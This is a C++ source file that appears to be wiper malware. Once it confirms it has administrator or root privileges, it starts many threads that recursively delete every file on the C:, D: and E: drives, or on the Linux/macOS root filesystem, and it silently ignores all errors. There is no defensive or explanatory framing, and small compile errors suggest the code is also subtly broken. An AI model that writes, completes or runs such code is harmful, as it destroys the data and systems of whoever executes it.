#include <iostream>
#include <filesystem>
#include <thread>
#include <vector>
#include <mutex>
#include <chrono>
#include <cstdlib>
#include <string>
#ifdef _WIN32
#include <windows.h>
#include <shlobj.h>
#elif defined(__linux__) || defined(__APPLE__)
#include <unistd.h>
#include <sys/stat.h>
#include <pwd.h>
#endif
namespace fs = std::filesystem;

std::mutex log_mutex;
// If you want to print something, it is recommended to use this
void Log(const std::string& message) {
    std::lock_guard<std::mutex> lock(log_mutex);
    std::cout << "[" << std::chrono::system_clock::to_time_t(std::chrono::system_clock::now()) << "] " << message << std::endl;
}

bool IsAdmin() {
#ifdef _WIN32
    BOOL fIsElevated = FALSE;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD dwSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(TOKEN_ELEVATION), &dwSize)) {
            fIsElevated = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return fIsElevated != 0;
#elif defined(__linux__) || defined(__APPLE__)
    uid_t euid = geteuid();
    struct passwd* pw = getpwuid(euid);
    return pw && !strcmp(pw->pw_name, "root");
#else
    return false;
#endif
}
void DeleteFiles(const fs::path& path) {
    try {
        if (fs::is_regular_file(path)) {
            fs::remove(path);
        } else if (fs::is_directory(path)) {
            for (const auto& entry : fs::directory_iterator(path)) {
                DeleteFiles(entry.path());
            }
            fs::remove(path);
        }
    } catch (const fs::filesystem_error& e) {
    }
}
void AttackSystem(const std::string& rootDir) {
    try {
        for (const auto& entry : fs::recursive_directory_iterator(rootDir)) {
            DeleteFiles(entry.path());
        }
    } catch (const fs::filesystem_error& e) {
    }
}
int main() {
    if (!IsAdmin()) {
        Log("Not running with admin privileges.");
        return 1;
    }

    Log("Running with admin privileges.");

    std::vector<std::thread> threads;
    const int numThreads = std::thread::hardware_concurrency();

#ifdef _WIN32
    std::vector<fs::path> drives = {"C:\\", "D:\\", "E:\\"};
#else
    std::vector<fs::path> drives = {"/"};
#endif

    for (const auto& drive : drives) {
        for (int i = 0; i < numThreads; ++i) {
            threads.emplace_back(AttackSystem, drive.string());
        }
    }

    for (auto& th : threads) {
        th.detach();
    }

    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    return 0;
}
